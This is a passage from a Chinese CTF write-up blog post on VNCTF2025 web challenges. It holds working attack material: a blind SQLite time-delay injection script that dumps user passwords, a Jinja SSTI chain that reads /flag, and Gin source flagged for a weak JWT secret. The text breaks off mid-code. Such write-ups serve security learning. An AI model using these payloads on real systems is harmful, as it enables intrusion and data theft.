<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/acvtar.jpg">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/acvtar.jpg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/acvtar.jpg">
  <link rel="mask-icon" href="/images/acvtar.jpg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.0.17/fancybox/fancybox.css" integrity="sha256-yE0aDX61mjiw8FoDuGetFttFoGJMeWsU/iYEFOfpMhA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"baozongwi.xyz","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="燃尽了XD">
<meta property="og:type" content="article">
<meta property="og:title" content="VNCTF2025">
<meta property="og:url" content="https://baozongwi.xyz/posts/2b933189.html">
<meta property="og:site_name" content="baozongwi:H@cking Th3 Fu1ure">
<meta property="og:description" content="燃尽了XD">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/2/VNCTF2025/QQ20250209-224527.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/2/VNCTF2025/QQ20250208-140255.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/2/VNCTF2025/QQ20250208-140405.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/2/VNCTF2025/QQ20250208-173258.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/2/VNCTF2025/QQ20250208-174102.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/2/VNCTF2025/QQ20250208-180500.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/2/VNCTF2025/QQ20250208-195150.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/2/VNCTF2025/QQ20250208-212413.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/2/VNCTF2025/QQ20250208-220140.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/2/VNCTF2025/QQ20250208-213120.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/2/VNCTF2025/QQ20250208-213942.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/2/VNCTF2025/QQ20250209-000009.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/2/VNCTF2025/QQ20250209-130637.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/2/VNCTF2025/QQ20250209-220553.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/2/VNCTF2025/QQ20250211-104414.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/2/VNCTF2025/QQ20250211-104344.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/2/VNCTF2025/QQ20250211-105348.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/2/VNCTF2025/QQ20250211-105512.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/2/VNCTF2025/QQ20250211-123657.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/2/VNCTF2025/QQ20250211-124927.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/2/VNCTF2025/QQ20250211-125246.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/2/VNCTF2025/QQ20250211-125332.jpg">
<meta property="article:published_time" content="2025-02-08T02:00:21.000Z">
<meta property="article:modified_time" content="2025-08-08T04:12:18.763Z">
<meta property="article:author" content="baozongwi">
<meta property="article:tag" content="sqlite">
<meta property="article:tag" content="ssti">
<meta property="article:tag" content="go">
<meta property="article:tag" content="Fastjson">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://baozongwi.xyz/images/achieve/2025/2/VNCTF2025/QQ20250209-224527.jpg">


<link rel="canonical" href="https://baozongwi.xyz/posts/2b933189.html">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://baozongwi.xyz/posts/2b933189.html","path":"posts/2b933189.html","title":"VNCTF2025"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>VNCTF2025 | baozongwi:H@cking Th3 Fu1ure</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.0.17/fancybox/fancybox.umd.js" integrity="sha256-32A/chfN6JgQkwK/QFZY8siVcOZj3LUt1vSKIcDvshM=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>




  <script src="/js/third-party/fancybox.js" defer></script>

  <script src="/js/third-party/pace.js" defer></script>


  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="baozongwi:H@cking Th3 Fu1ure" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">baozongwi:H@cking Th3 Fu1ure</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>links</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="Searching..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6"><span class="nav-number">1.</span> <span class="nav-text">奶龙回家</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%A6%E7%94%9F%E5%A7%93%E5%90%8D%E7%99%BB%E8%AE%B0%E7%B3%BB%E7%BB%9F"><span class="nav-number">2.</span> <span class="nav-text">学生姓名登记系统</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Gin"><span class="nav-number">3.</span> <span class="nav-text">Gin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easymath"><span class="nav-number">4.</span> <span class="nav-text">easymath</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VN-Lang"><span class="nav-number">5.</span> <span class="nav-text">VN_Lang</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#javaGuide"><span class="nav-number">6.</span> <span class="nav-text">javaGuide</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AD%BE%E4%B8%AA%E5%88%B0%E5%90%A7"><span class="nav-number">7.</span> <span class="nav-text">签个到吧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hook-Fish"><span class="nav-number">8.</span> <span class="nav-text">Hook Fish</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#remake"><span class="nav-number"></span> <span class="nav-text">remake</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-emlog"><span class="nav-number">1.</span> <span class="nav-text">ez_emlog</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="baozongwi"
      src="/images/acvtar.jpg">
  <p class="site-author-name" itemprop="name">baozongwi</p>
  <div class="site-description" itemprop="description">天地不仁，以万物为刍狗</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">202</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">42</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/baozongwi" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;baozongwi" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:baozongwi@qq.com" title="E-Mail → mailto:baozongwi@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>
<ul>
  <li><a href="/"><i class="fa fa-home"></i> home</a></li>
  <li><a href="/archives/"><i class="fa fa-archive"></i> archives</a></li>
  <li><a href="/tags/"><i class="fa fa-tags"></i> tags</a></li>
  <li><a href="/about/"><i class="fa fa-user"></i> about</a></li>
  <li><a href="/links/"><i class="fa fa-link"></i> links</a></li>
</ul>
        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://baozongwi.xyz/posts/2b933189.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/acvtar.jpg">
      <meta itemprop="name" content="baozongwi">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="baozongwi:H@cking Th3 Fu1ure">
      <meta itemprop="description" content="天地不仁，以万物为刍狗">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="VNCTF2025 | baozongwi:H@cking Th3 Fu1ure">
      <meta itemprop="description" content="燃尽了XD">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          VNCTF2025
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2025-02-08 10:00:21" itemprop="dateCreated datePublished" datetime="2025-02-08T10:00:21+08:00">2025-02-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2025-08-08 12:12:18" itemprop="dateModified" datetime="2025-08-08T12:12:18+08:00">2025-08-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%B5%9B%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">赛题</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>65k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>1:49</span>
    </span>
</div>

            <div class="post-description">燃尽了XD</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p><img src="/../images/achieve/2025/2/VNCTF2025/QQ20250209-224527.jpg" alt="1"></p>
<p>总排第七，差一道AKWeb哎，难受</p>
<h2 id="奶龙回家"><a href="#奶龙回家" class="headerlink" title="奶龙回家"></a><strong>奶龙回家</strong></h2><p>爆破了很久的弱密码，发现<code>======</code>会触发另外一个回显</p>
<p><img src="/../images/achieve/2025/2/VNCTF2025/QQ20250208-140255.jpg" alt="1"></p>
<p>就感觉是注入了，然后写查询语句，发现万能密码都被过滤了，但是fuzz出来了这个东西会触发另外一种回显，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;randomblob(N)--</span><br></pre></td></tr></table></figure>

<p><img src="/../images/achieve/2025/2/VNCTF2025/QQ20250208-140405.jpg" alt="1"></p>
<p>可以确定是sqlite注入了，慢慢测试发现就过滤了<code>union</code>，绕过这个应该就可以拿到了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;UNION/**/select/**/sql/**/from/**/sqlite_schema--</span><br></pre></td></tr></table></figure>

<p>写出延时语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;&#x27;OR/**/(case/**/when(substr(sqlite_version(),1,1)&lt;&#x27;310&#x27;)/**/then/**/randomblob(1000000000)/**/else/**/0/**/end);--&quot;</span><br></pre></td></tr></table></figure>

<p>然后写脚本，有些函数<code>sqlite</code>是没有的，所以只能慢慢写</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node.vnteam.cn:47163/login&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line">        <span class="comment"># payload = &#x27;sqlite_version()&#x27;</span></span><br><span class="line">        <span class="comment"># payload = &#x27;select/**/group_concat(sql)/**/from/**/sqlite_master&#x27;</span></span><br><span class="line">        <span class="comment"># payload = &#x27;select/**/group_concat(sql)/**/FROM/**/sqlite_master/**/WHERE/**/type=\&#x27;table\&#x27;/**/AND/**/name=\&#x27;users\&#x27;;&#x27;</span></span><br><span class="line">        <span class="comment"># payload = &#x27;select/**/group_concat(username)/**/from/**/users&#x27;</span></span><br><span class="line">        payload = <span class="string">&#x27;select/**/group_concat(password)/**/from/**/users&#x27;</span></span><br><span class="line">        username = <span class="string">&#x27;baozongwi&#x27;</span></span><br><span class="line">        char = <span class="built_in">chr</span>(mid)</span><br><span class="line">        password = <span class="string">&quot;&#x27;or/**/(case/**/when(substr((&#123;&#125;),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;)/**/then/**/randomblob(1000000000)/**/else/**/0/**/end)--&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            payload, i, char)</span><br><span class="line">        json = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: password</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.post(url=url, json=json, timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;\r[*]trying: <span class="subst">&#123;result&#125;</span>[<span class="subst">&#123;head&#125;</span>-<span class="subst">&#123;tail&#125;</span>]&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;\r[*]trying: <span class="subst">&#123;result&#125;</span>[<span class="subst">&#123;head&#125;</span>-<span class="subst">&#123;tail&#125;</span>]&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;\r[*]result: <span class="subst">&#123;result&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nailong\woaipangmao114514</span><br></pre></td></tr></table></figure>

<p>不稳定，基本上一个靶机只有第一次跑的是对的，其他的都是乱的</p>
<h2 id="学生姓名登记系统"><a href="#学生姓名登记系统" class="headerlink" title="学生姓名登记系统"></a><strong>学生姓名登记系统</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7+7&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>测试很久发现可以类似的<code>config.update</code>进行叠加，但是这里使用的是<code>:=</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;a:=().__class__&#125;&#125;</span><br><span class="line">&#123;&#123;b:=a.__base__&#125;&#125;</span><br><span class="line">&#123;&#123;c:=b.__subclasses__&#125;&#125;</span><br><span class="line">&#123;&#123;d:=c()[154]&#125;&#125;</span><br><span class="line">&#123;&#123;e:=d.__init__&#125;&#125;</span><br><span class="line">&#123;&#123;f:=e.__globals__&#125;&#125;</span><br><span class="line">&#123;&#123;x:=&#x27;__builtins__&#x27;&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;a:=().__class__&#125;&#125;</span><br><span class="line">&#123;&#123;b:=a.__base__&#125;&#125;</span><br><span class="line">&#123;&#123;c:=b.__subclasses__&#125;&#125;</span><br><span class="line">&#123;&#123;d:=c()[154]&#125;&#125;</span><br><span class="line">&#123;&#123;e:=d.__init__&#125;&#125;</span><br><span class="line">&#123;&#123;f:=e.__globals__&#125;&#125;</span><br><span class="line">&#123;&#123;x:=&#x27;__builtins__&#x27;&#125;&#125;</span><br><span class="line">&#123;&#123;g:=f[x]&#125;&#125;</span><br><span class="line">&#123;&#123;h:=g[&#x27;op&#x27;&#x27;en&#x27;]&#125;&#125;</span><br><span class="line">&#123;&#123;i:=h(&#x27;/flag&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;j:=i.read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>就可以了</p>
<h2 id="Gin"><a href="#Gin" class="headerlink" title="Gin"></a><strong>Gin</strong></h2><p>进来先看路由，发现应该是最开始要进行一个越权，然后再操作</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> routes</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;GinTest/controllers&quot;</span></span><br><span class="line">	<span class="string">&quot;GinTest/middleware&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SetupRoutes</span><span class="params">(r *gin.Engine)</span></span> *gin.Engine &#123;</span><br><span class="line">	r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.Redirect(http.StatusFound, <span class="string">&quot;/login&quot;</span>)</span><br><span class="line">	&#125;)</span><br><span class="line">	r.GET(<span class="string">&quot;/register&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.File(<span class="string">&quot;./static/register.html&quot;</span>)</span><br><span class="line">	&#125;)</span><br><span class="line">	r.POST(<span class="string">&quot;/register&quot;</span>, controllers.Register)</span><br><span class="line">	r.GET(<span class="string">&quot;/login&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.File(<span class="string">&quot;./static/login.html&quot;</span>)</span><br><span class="line">	&#125;)</span><br><span class="line">	r.POST(<span class="string">&quot;/login&quot;</span>, controllers.Login)</span><br><span class="line">	r.GET(<span class="string">&quot;/user&quot;</span>, middleware.AuthMiddleware(<span class="string">&quot;user&quot;</span>), <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.File(<span class="string">&quot;./static/user.html&quot;</span>)</span><br><span class="line">	&#125;)</span><br><span class="line">	r.POST(<span class="string">&quot;/upload&quot;</span>, middleware.AuthMiddleware(<span class="string">&quot;upload&quot;</span>), controllers.Upload)</span><br><span class="line">	r.GET(<span class="string">&quot;/download&quot;</span>, middleware.AuthMiddleware(<span class="string">&quot;download&quot;</span>), controllers.Download)</span><br><span class="line">	r.GET(<span class="string">&quot;/admin&quot;</span>, middleware.AuthMiddleware(<span class="string">&quot;admin&quot;</span>), <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.File(<span class="string">&quot;./static/admin.html&quot;</span>)</span><br><span class="line">	&#125;)</span><br><span class="line">	r.POST(<span class="string">&quot;/eval&quot;</span>, middleware.AuthMiddleware(<span class="string">&quot;admin&quot;</span>), controllers.Eval)</span><br><span class="line">	<span class="keyword">return</span> r</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到jwt这里使用的是伪随机数</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> utils</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span 